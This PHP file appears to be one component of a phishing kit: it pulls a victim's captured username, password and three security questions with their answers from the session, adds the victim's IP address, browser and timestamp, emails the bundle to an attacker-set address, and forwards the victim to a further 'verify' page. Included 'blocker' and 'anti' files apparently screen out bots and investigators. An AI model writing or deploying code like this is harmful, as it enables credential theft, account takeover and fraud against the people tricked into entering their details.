<?php
session_start();
include "email.php";
	include('blocker.php');
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
				include './prevents/block.php';
				
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");

$aa = $_SESSION['user'];
$pp = $_SESSION['pass'];

$q1 = $_SESSION['q1'];
$q2 = $_SESSION['q2'];
$q3 = $_SESSION['q3'];

$a1 = $_SESSION['a1'];
$a2 = $_SESSION['a2'];
$a3 = $_SESSION['a3'];
$data ="
## Laur LOGIN ##
|USER : $aa
|PASS : $pp
|Q1: $q1
|A1: $a1
|
|Q2: $q2
|A2: $a2
|
|Q3: $q3
|A3: $a3
## first ##
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##laur QUEST #$aa $pp $ip";

if(strlen($aa)!= 4 || strlen($aa)!=16){
    mail($emailusr,$subj,$data);
}



header("Location: verify.php");

?>